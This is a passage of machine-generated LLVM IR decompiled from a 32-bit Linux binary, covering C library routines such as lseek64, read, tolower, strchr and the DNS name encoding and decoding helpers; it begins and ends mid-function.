  uselistorder i32 %v3_8050665, { 1, 2, 0 }
  uselistorder i8 %v2_805057f95, { 1, 2, 0 }
  uselistorder i8* %v1_805057f94, { 1, 0 }
  uselistorder i32 %v0_805057f47, { 1, 0 }
  uselistorder i32 %v2_80505a5, { 1, 0 }
  uselistorder i32 %v1_805059e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80505a8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050593, { 1, 0 }
  uselistorder i32 %v0_8050593, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8050585, { 1, 0 }
  uselistorder i32 %v3_8050665124, { 1, 0 }
  uselistorder i8* %v2_80505fe, { 1, 0 }
  uselistorder i32 %v4_8050661, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8050422, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80503fd, { 1, 0 }
  uselistorder i32 %v1_80503e0, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 8, 9, 10, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 9, 13, 14, 15, 16, 18, 17, 7, 8, 10, 11, 12, 19, 22, 20, 21, 0, 1, 2, 3, 4 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 4, 0, 2, 1, 3 }
  uselistorder i32 (i32, i8*, i32, i32)* @inet_pton, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strcoll, { 3, 0, 1, 2 }
  uselistorder i32 5, { 11, 13, 14, 15, 0, 10, 4, 5, 12, 6, 16, 17, 7, 1, 2, 18, 3, 8, 9 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 25, 0, 1, 16, 2, 22, 26, 27, 23, 24, 3, 14, 4, 15, 5, 6, 7, 8, 11, 10, 9, 12, 13 }
  uselistorder i32* @global_var_8054320, { 0, 4, 2, 5, 1, 3, 6 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 3, 0, 4, 2, 7, 6, 5 }
  uselistorder i32 10, { 14, 1, 23, 24, 25, 26, 27, 28, 2, 18, 19, 21, 20, 3, 6, 29, 7, 31, 9, 8, 15, 4, 12, 17, 22, 10, 30, 16, 0, 5, 11, 13 }
  uselistorder i32 12, { 47, 48, 49, 0, 50, 15, 23, 51, 52, 17, 16, 5, 56, 6, 7, 8, 9, 10, 11, 12, 53, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 109, 22, 24, 27, 46, 25, 26, 82, 83, 84, 85, 86, 87, 88, 74, 75, 76, 77, 78, 79, 80, 81, 28, 29, 30, 31, 32, 33, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 18, 73, 89, 90, 91, 92, 110, 105, 1, 2, 106, 107, 13, 14, 108, 3, 54, 55, 4, 34, 35, 36, 37, 38, 39, 40, 41, 21, 19, 20, 42, 43, 44, 45, 93 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 4, 14, 9, 10, 11, 12, 13, 1, 6, 2, 7, 3, 0, 15, 8, 5 }
  uselistorder i32 44, { 2, 3, 4, 1, 15, 16, 17, 6, 7, 0, 11, 13, 12, 8, 9, 10, 14, 5 }
  uselistorder i32 36, { 4, 5, 6, 8, 9, 10, 11, 12, 13, 0, 14, 1, 2, 15, 7, 3, 16, 17, 18, 19 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 13, 12, 3, 9, 4, 14, 15, 0, 10, 6, 5, 1, 11, 7, 8, 16, 17, 18, 19, 2 }
  uselistorder i32 -48, { 1, 2, 3, 0, 4 }
  uselistorder i32 16, { 48, 47, 6, 49, 50, 14, 4, 51, 15, 52, 88, 89, 60, 61, 62, 63, 64, 65, 72, 66, 67, 68, 69, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 53, 54, 55, 56, 90, 91, 92, 93, 94, 95, 96, 97, 112, 16, 17, 28, 18, 45, 23, 29, 31, 30, 116, 7, 32, 33, 34, 0, 8, 83, 10, 9, 84, 1, 11, 85, 86, 21, 117, 57, 58, 98, 99, 100, 101, 102, 103, 2, 104, 105, 106, 107, 108, 12, 109, 110, 24, 111, 113, 114, 115, 59, 5, 35, 36, 3, 37, 38, 41, 25, 26, 39, 40, 42, 13, 43, 44, 19, 20, 46, 27, 22, 87 }
  uselistorder i32 8, { 75, 74, 76, 8, 9, 77, 78, 79, 80, 81, 82, 0, 83, 10, 7, 84, 85, 86, 32, 143, 34, 15, 16, 17, 18, 35, 19, 20, 21, 36, 22, 37, 23, 38, 39, 88, 144, 145, 146, 147, 148, 149, 33, 150, 151, 152, 171, 172, 173, 29, 178, 30, 179, 47, 31, 48, 24, 50, 53, 73, 51, 52, 134, 135, 136, 137, 138, 139, 140, 1, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 2, 54, 55, 56, 57, 58, 59, 60, 61, 95, 96, 97, 98, 99, 41, 3, 42, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 40, 117, 118, 5, 119, 120, 121, 122, 6, 123, 141, 142, 11, 177, 89, 90, 12, 13, 49, 153, 154, 155, 156, 158, 159, 160, 157, 161, 162, 163, 164, 25, 26, 165, 166, 167, 168, 169, 170, 14, 174, 175, 176, 91, 92, 93, 94, 87, 62, 64, 27, 63, 65, 66, 67, 68, 69, 46, 43, 44, 45, 28, 70, 71, 72 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 40, 21, 41, 42, 20, 24, 34, 0, 1, 2, 3, 4, 5, 47, 30, 48, 49, 50, 28, 29, 51, 18, 65, 25, 33, 66, 67, 39, 19, 35, 36, 7, 6, 8, 9, 31, 10, 22, 45, 43, 44, 52, 53, 23, 54, 55, 56, 57, 58, 59, 60, 11, 61, 62, 32, 63, 64, 46, 12, 13, 37, 15, 14, 26, 38, 27, 17, 16 }
  uselistorder i32 4, { 134, 135, 136, 130, 128, 129, 131, 132, 133, 27, 2, 137, 138, 139, 140, 141, 142, 143, 144, 145, 32, 77, 78, 79, 33, 34, 35, 146, 53, 28, 93, 3, 4, 219, 220, 221, 222, 223, 224, 5, 147, 80, 258, 259, 260, 150, 151, 152, 153, 154, 155, 60, 156, 163, 164, 165, 63, 36, 166, 167, 168, 169, 37, 38, 39, 64, 40, 41, 42, 43, 170, 44, 171, 65, 45, 66, 67, 6, 157, 158, 159, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 57, 235, 261, 236, 262, 263, 265, 266, 0, 270, 271, 272, 264, 54, 74, 273, 274, 275, 276, 277, 278, 7, 81, 82, 83, 84, 85, 68, 94, 95, 96, 61, 122, 123, 124, 125, 86, 87, 88, 89, 90, 62, 8, 91, 92, 267, 268, 199, 208, 209, 210, 211, 212, 9, 200, 201, 202, 203, 204, 205, 206, 207, 197, 198, 97, 58, 98, 99, 100, 101, 102, 103, 104, 10, 106, 105, 172, 56, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 25, 193, 194, 196, 195, 11, 69, 213, 214, 55, 215, 216, 217, 218, 29, 12, 30, 269, 13, 107, 237, 14, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 46, 47, 75, 31, 255, 256, 257, 160, 15, 161, 59, 162, 148, 149, 49, 48, 50, 51, 108, 16, 109, 17, 18, 19, 110, 20, 111, 112, 21, 113, 73, 114, 70, 71, 72, 52, 115, 116, 117, 118, 1, 119, 22, 120, 121, 126, 26, 23, 127, 24, 279, 76 }
  uselistorder i32* @ebp, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 10, 11, 12, 1, 13, 14, 15, 4, 59, 60, 61, 66, 62, 63, 64, 65, 67, 146, 147, 68, 72, 83, 84, 113, 114, 115, 148, 149, 150, 151, 152, 175, 176, 177, 16, 17, 18, 19, 20, 130, 131, 132, 133, 134, 21, 22, 116, 117, 118, 119, 120, 121, 122, 123, 128, 124, 125, 126, 127, 3, 129, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 5, 153, 154, 155, 156, 157, 78, 2, 79, 80, 81, 82, 73, 74, 75, 76, 77, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 0, 169, 7, 8, 9, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 97, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 170, 171, 172, 69, 70, 71, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 41, 42, 43, 178, 173, 174 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8050695, { 9, 8, 0, 10, 2, 1, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8050675, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805065b.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050611, { 1, 0 }
  uselistorder label %dec_label_pc_80505f5, { 1, 0 }
  uselistorder label %dec_label_pc_80505b8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805057f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80505a5, { 1, 0 }
  uselistorder label %dec_label_pc_8050573, { 1, 0 }
  uselistorder label %dec_label_pc_805055c, { 1, 0 }
  uselistorder label %dec_label_pc_805055c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8050545, { 1, 0 }
  uselistorder label %dec_label_pc_805050a, { 1, 0 }
  uselistorder label %dec_label_pc_8050461, { 1, 0 }
  uselistorder label %dec_label_pc_80503f1, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80506a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80506a6, i32* %stack_var_-12, align 4
  %v2_80506ba = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80506ba, i32* %esi.global-to-local, align 4
  %v1_80506d1 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80506d1, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80506d1, -4095
  br i1 %tmp18, label %dec_label_pc_80506eb, label %dec_label_pc_80506dd

dec_label_pc_80506dd:                             ; preds = %entry
  %v2_80506be = ashr i32 %arg3, 31
  %v1_80506dd = call i32 @__errno_location(i32 %v2_80506be)
  %v0_80506e2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506e2 = sub i32 0, %v0_80506e2
  %v2_80506e4 = inttoptr i32 %v1_80506dd to i32*
  store i32 %v1_80506e2, i32* %v2_80506e4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80506ff.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80506ef

dec_label_pc_80506eb:                             ; preds = %entry
  %v1_80506eb = icmp eq i32 %v1_80506d1, 0
  br i1 %v1_80506eb, label %dec_label_pc_80506f4, label %dec_label_pc_80506ef

dec_label_pc_80506ef:                             ; preds = %dec_label_pc_80506eb, %dec_label_pc_80506dd
  %v2_80506ff.pre = phi i32 [ %v0_80506a6, %dec_label_pc_80506eb ], [ %v2_80506ff.pre.pre, %dec_label_pc_80506dd ]
  %v0_80506ef = phi i32 [ %v1_80506d1, %dec_label_pc_80506eb ], [ -1, %dec_label_pc_80506dd ]
  %v1_80506f1 = ashr i32 %v0_80506ef, 31
  br label %dec_label_pc_80506fc

dec_label_pc_80506f4:                             ; preds = %dec_label_pc_80506eb
  %v3_80506f4 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80506fc

dec_label_pc_80506fc:                             ; preds = %dec_label_pc_80506ef, %dec_label_pc_80506f4
  %v2_80506ff = phi i32 [ %v2_80506ff.pre, %dec_label_pc_80506ef ], [ %v0_80506a6, %dec_label_pc_80506f4 ]
  %v0_8050702 = phi i32 [ %v0_80506ef, %dec_label_pc_80506ef ], [ %v3_80506f4, %dec_label_pc_80506f4 ]
  %storemerge = phi i32 [ %v1_80506f1, %dec_label_pc_80506ef ], [ %tmp, %dec_label_pc_80506f4 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_80506ff, i32* @ebx, align 4
  ret i32 %v0_8050702

; uselistorder directives
  uselistorder i32 %v1_80506d1, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80506a6, { 1, 0, 2 }
  uselistorder i32 31, { 24, 25, 13, 26, 27, 0, 1, 22, 23, 28, 29, 11, 4, 5, 2, 3, 10, 17, 14, 15, 16, 8, 9, 6, 7, 12, 30, 31, 18, 19, 20, 21 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_80506fc, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050704 = load i32, i32* @edi, align 4
  store i32 %v0_8050704, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050714 = load i32, i32* @ebx, align 4
  %v4_805071c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050714, i32* @ebx, align 4
  store i32 %v4_805071c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_805071c, -4095
  br i1 %tmp11, label %dec_label_pc_8050734, label %dec_label_pc_8050728

dec_label_pc_8050728:                             ; preds = %entry
  %v1_8050728 = call i32 @__errno_location(i32 %v0_8050714)
  %v0_805072d = load i32, i32* %edi.global-to-local, align 4
  %v1_805072d = sub i32 0, %v0_805072d
  %v2_805072f = inttoptr i32 %v1_8050728 to i32*
  store i32 %v1_805072d, i32* %v2_805072f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050734

dec_label_pc_8050734:                             ; preds = %entry, %dec_label_pc_8050728
  %v0_8050734 = phi i32 [ %v4_805071c, %entry ], [ -1, %dec_label_pc_8050728 ]
  %v2_8050738 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050738, i32* @edi, align 4
  ret i32 %v0_8050734

; uselistorder directives
  uselistorder i32 %v4_805071c, { 1, 0, 2 }
  uselistorder i32 %v0_8050714, { 1, 0 }
  uselistorder i32 (i32)* @__errno_location, { 46, 31, 23, 68, 67, 66, 45, 44, 30, 29, 43, 22, 42, 21, 39, 28, 27, 17, 16, 15, 14, 13, 34, 60, 12, 65, 11, 10, 9, 8, 64, 7, 6, 5, 38, 4, 33, 1, 0, 51, 50, 63, 62, 61, 59, 36, 35, 32, 26, 25, 24, 2, 41, 40, 18, 49, 48, 20, 3, 58, 19, 57, 56, 47, 37, 55, 54, 53, 52 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 30, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder label %dec_label_pc_8050734, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050740 = add i32 %arg1, 128
  %v6_805074b = icmp ugt i32 %v1_8050740, 383
  br i1 %v6_805074b, label %dec_label_pc_8050756, label %dec_label_pc_805074d

dec_label_pc_805074d:                             ; preds = %entry
  %v0_805074d = load i32, i32* bitcast (i32** @global_var_8054328.334 to i32*), align 8
  %v2_8050752 = mul i32 %arg1, 2
  %v3_8050752 = add i32 %v0_805074d, %v2_8050752
  %v4_8050752 = inttoptr i32 %v3_8050752 to i16*
  %v5_8050752 = load i16, i16* %v4_8050752, align 2
  %v6_8050752 = sext i16 %v5_8050752 to i32
  store i32 %v6_8050752, i32* @edx, align 4
  br label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %entry, %dec_label_pc_805074d
  %v0_8050756 = phi i32 [ %arg1, %entry ], [ %v6_8050752, %dec_label_pc_805074d ]
  ret i32 %v0_8050756

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 24, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 20, 25, 27, 21, 23, 22, 26 }
  uselistorder i32 128, { 14, 10, 12, 2, 3, 6, 11, 7, 8, 13, 4, 9, 15, 0, 16, 17, 5, 1, 18 }
  uselistorder label %dec_label_pc_8050756, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805075d = ptrtoint i8* %arg1 to i32
  %v2_8050765 = mul i32 %arg2, 256
  %v3_8050765 = and i32 %v2_8050765, 65280
  %v4_8050765 = and i32 %arg2, -65281
  %v5_8050765 = or i32 %v3_8050765, %v4_8050765
  %v8_8050767.pre = load i1, i1* @df, align 1
  %v9_8050767 = select i1 %v8_8050767.pre, i32 -1, i32 1
  br label %dec_label_pc_8050767

dec_label_pc_8050767:                             ; preds = %dec_label_pc_805076c, %entry
  %v4_8050767 = phi i32 [ %v6_8050767, %dec_label_pc_805076c ], [ %v5_8050765, %entry ]
  %v7_8050767 = phi i32 [ %v10_8050767, %dec_label_pc_805076c ], [ %v4_805075d, %entry ]
  %v1_8050767 = inttoptr i32 %v7_8050767 to i8*
  %v2_8050767 = load i8, i8* %v1_8050767, align 1
  %v10_8050767 = add i32 %v7_8050767, %v9_8050767
  %v3_8050768 = udiv i32 %v4_8050767, 256
  %v4_8050768 = trunc i32 %v3_8050768 to i8
  %v16_8050768 = icmp eq i8 %v2_8050767, %v4_8050768
  br i1 %v16_8050768, label %dec_label_pc_8050775.loopexit, label %dec_label_pc_805076c

dec_label_pc_805076c:                             ; preds = %dec_label_pc_8050767
  %v3_8050767 = zext i8 %v2_8050767 to i32
  %v5_8050767 = and i32 %v4_8050767, -256
  %v6_8050767 = or i32 %v3_8050767, %v5_8050767
  %v4_805076c = icmp eq i8 %v2_8050767, 0
  %v1_805076e = icmp eq i1 %v4_805076c, false
  br i1 %v1_805076e, label %dec_label_pc_8050767, label %dec_label_pc_8050770

dec_label_pc_8050770:                             ; preds = %dec_label_pc_805076c
  br label %dec_label_pc_8050775

dec_label_pc_8050775.loopexit:                    ; preds = %dec_label_pc_8050767
  %phitmp = add i32 %v10_8050767, -1
  br label %dec_label_pc_8050775

dec_label_pc_8050775:                             ; preds = %dec_label_pc_8050775.loopexit, %dec_label_pc_8050770
  %v0_8050775 = phi i32 [ 0, %dec_label_pc_8050770 ], [ %phitmp, %dec_label_pc_8050775.loopexit ]
  ret i32 %v0_8050775

; uselistorder directives
  uselistorder i8 %v2_8050767, { 1, 2, 0 }
  uselistorder i32 %v4_8050767, { 1, 0 }
  uselistorder i32 -256, { 36, 1, 37, 0, 38, 11, 12, 39, 40, 3, 14, 13, 2, 41, 42, 6, 43, 4, 44, 5, 45, 50, 8, 16, 15, 7, 52, 53, 46, 54, 55, 56, 57, 58, 59, 71, 60, 32, 33, 34, 17, 72, 51, 49, 73, 30, 74, 47, 61, 62, 63, 64, 65, 9, 66, 67, 10, 68, 69, 70, 48, 22, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 31, 35 }
  uselistorder i1* @df, { 1, 5, 20, 21, 0, 2, 22, 23, 24, 13, 3, 28, 4, 26, 27, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 25 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805077d = load i32, i32* @edi, align 4
  %v0_805077e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8050785 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050785, i32* @edi, align 4
  %v1_80507e45 = icmp eq i8* %arg1, null
  br i1 %v1_80507e45, label %dec_label_pc_80507ed, label %dec_label_pc_80507e8.lr.ph

dec_label_pc_80507e8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80507e8

dec_label_pc_805078b:                             ; preds = %dec_label_pc_80507e8
  %v0_805078b = load i32, i32* @edx, align 4
  %v9_8050790 = call i32 @__GI_strchr(i8* %v1_80507e8, i32 46, i32 %v0_805078b, i32 %v0_805078b)
  %v1_805079a = icmp eq i32 %v9_8050790, 0
  br i1 %v1_805079a, label %dec_label_pc_80507a4, label %dec_label_pc_805079e

dec_label_pc_805079e:                             ; preds = %dec_label_pc_805078b
  %v1_80507a0 = load i32, i32* @edi, align 4
  %v2_80507a0 = sub i32 %v9_8050790, %v1_80507a0
  br label %dec_label_pc_80507b2

dec_label_pc_80507a4:                             ; preds = %dec_label_pc_805078b
  %v0_80507a7 = load i32, i32* @edi, align 4
  %v5_80507a7 = inttoptr i32 %v0_80507a7 to i8*
  %v3_80507a8 = call i32 @strlen(i8* %v5_80507a7)
  br label %dec_label_pc_80507b2

dec_label_pc_80507b2:                             ; preds = %dec_label_pc_805079e, %dec_label_pc_80507a4
  %v0_80507c5 = phi i32 [ %v2_80507a0, %dec_label_pc_805079e ], [ %v3_80507a8, %dec_label_pc_80507a4 ]
  store i32 %v0_80507c5, i32* @esi, align 4
  %v1_80507b2 = icmp eq i32 %v0_80507c5, 0
  %v3_80507b2 = trunc i32 %v0_80507c5 to i8
  br i1 %v1_80507b2, label %dec_label_pc_8050801, label %dec_label_pc_80507b6

dec_label_pc_80507b6:                             ; preds = %dec_label_pc_80507b2
  %v1_80507ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80507ba = sub i32 %arg3, %v1_80507ba
  %v1_80507bc = add i32 %v2_80507ba, -1
  %v7_80507bd = icmp ult i32 %v0_80507c5, %v1_80507bc
  %v1_80507bf = icmp eq i1 %v7_80507bd, false
  br i1 %v1_80507bf, label %dec_label_pc_8050801, label %dec_label_pc_80507c1

dec_label_pc_80507c1:                             ; preds = %dec_label_pc_80507b6
  store i32 %arg2, i32* @edx, align 4
  %v4_80507c7 = add i32 %v1_80507ba, %arg2
  %v5_80507c7 = inttoptr i32 %v4_80507c7 to i8*
  store i8 %v3_80507b2, i8* %v5_80507c7, align 1
  %v0_80507ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507ca = add i32 %v0_80507ca, 1
  %v0_80507cc = load i32, i32* @edx, align 4
  %v2_80507ce = add i32 %v1_80507ca, %v0_80507cc
  %v0_80507d0 = load i32, i32* @esi, align 4
  %v0_80507d1 = load i32, i32* @edi, align 4
  %v2_80507d3 = add i32 %v0_80507d0, %v1_80507ca
  store i32 %v2_80507d3, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_80507ce to i16*
  %v7_80507d5 = call i32 @memcpy(i16* %tmp30, i32 %v0_80507d1, i32 %v0_80507d0)
  %v1_80507e1 = add i32 %v9_8050790, 1
  br i1 %v1_805079a, label %dec_label_pc_80507ed, label %dec_label_pc_80507e4

dec_label_pc_80507e4:                             ; preds = %dec_label_pc_80507c1
  store i32 %v1_80507e1, i32* @edi, align 4
  %v1_80507e4 = icmp eq i32 %v1_80507e1, 0
  br i1 %v1_80507e4, label %dec_label_pc_80507ed, label %dec_label_pc_80507e8

dec_label_pc_80507e8:                             ; preds = %dec_label_pc_80507e8.lr.ph, %dec_label_pc_80507e4
  %v0_805078f = phi i32 [ %v4_8050785, %dec_label_pc_80507e8.lr.ph ], [ %v1_80507e1, %dec_label_pc_80507e4 ]
  %v1_80507e8 = inttoptr i32 %v0_805078f to i8*
  %v2_80507e8 = load i8, i8* %v1_80507e8, align 1
  %v3_80507e8 = icmp eq i8 %v2_80507e8, 0
  %v1_80507eb = icmp eq i1 %v3_80507e8, false
  br i1 %v1_80507eb, label %dec_label_pc_805078b, label %dec_label_pc_80507ed

dec_label_pc_80507ed:                             ; preds = %dec_label_pc_80507e4, %dec_label_pc_80507e8, %dec_label_pc_80507c1, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8050801, label %dec_label_pc_80507f4

dec_label_pc_80507f4:                             ; preds = %dec_label_pc_80507ed
  %v1_80507f8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80507f8 = add i32 %v1_80507f8, %arg2
  %v3_80507f8 = inttoptr i32 %v2_80507f8 to i8*
  store i8 0, i8* %v3_80507f8, align 1
  %v0_80507fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507fc = add i32 %v0_80507fc, 1
  br label %dec_label_pc_8050804

dec_label_pc_8050801:                             ; preds = %dec_label_pc_80507b6, %dec_label_pc_80507b2, %dec_label_pc_80507ed
  br label %dec_label_pc_8050804

dec_label_pc_8050804:                             ; preds = %dec_label_pc_80507f4, %dec_label_pc_8050801
  %storemerge3 = phi i32 [ %v1_80507fc, %dec_label_pc_80507f4 ], [ -1, %dec_label_pc_8050801 ]
  store i32 %v0_805077e, i32* @esi, align 4
  store i32 %v0_805077d, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_80507e8, { 1, 0 }
  uselistorder i32 %v1_80507e1, { 0, 2, 1 }
  uselistorder i32 %v0_80507d0, { 1, 0 }
  uselistorder i1 %v1_805079a, { 1, 0 }
  uselistorder i32 %v9_8050790, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strchr, { 0, 2, 1 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 4, 2, 6, 0, 1, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8050804, { 1, 0 }
  uselistorder label %dec_label_pc_8050801, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80507ed, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80507e8, { 1, 0 }
  uselistorder label %dec_label_pc_80507b2, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805080e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8050817 = icmp eq i32 %arg1, 0
  br i1 %v4_8050817, label %dec_label_pc_80508d8, label %dec_label_pc_8050822

dec_label_pc_8050822:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80508c02740 = add i32 %arg2, %arg1
  %v3_80508c02841 = inttoptr i32 %v2_80508c02740 to i8*
  %v4_80508c02942 = load i8, i8* %v3_80508c02841, align 1
  %v1_80508c43144 = icmp eq i8 %v4_80508c02942, 0
  %v1_80508c63245 = icmp eq i1 %v1_80508c43144, false
  br i1 %v1_80508c63245, label %dec_label_pc_8050830.lr.ph, label %dec_label_pc_80508cc

dec_label_pc_8050830:                             ; preds = %dec_label_pc_8050830.lr.ph, %dec_label_pc_8050849
  %v0_805083a = phi i32 [ %v0_805083a.pre, %dec_label_pc_8050830.lr.ph ], [ %v4_8050854, %dec_label_pc_8050849 ]
  %v8_805083038 = phi i1 [ %v8_80508303350, %dec_label_pc_8050830.lr.ph ], [ true, %dec_label_pc_8050849 ]
  %v5_80508c037.in = phi i8 [ %v5_80508c03049.in, %dec_label_pc_8050830.lr.ph ], [ %v4_80508c0, %dec_label_pc_8050849 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8050830.lr.ph ], [ 0, %dec_label_pc_8050849 ]
  %v0_805083735 = phi i32 [ %v0_8050837.ph46, %dec_label_pc_8050830.lr.ph ], [ %v2_8050863, %dec_label_pc_8050849 ]
  %v5_80508c037 = zext i8 %v5_80508c037.in to i32
  %v1_8050837 = add i32 %v0_805083735, 1
  store i32 %v1_8050837, i32* @esi, align 4
  %v3_805083a = select i1 %v8_805083038, i32 2, i32 1
  %v4_805083a = add i32 %v3_805083a, %v0_805083a
  store i32 %v4_805083a, i32* %ebp.global-to-local, align 4
  %v1_805083d = and i32 %v5_80508c037, 192
  %v6_8050842 = icmp eq i32 %v1_805083d, 192
  %v1_8050847 = icmp eq i1 %v6_8050842, false
  br i1 %v1_8050847, label %dec_label_pc_805086c, label %dec_label_pc_8050849

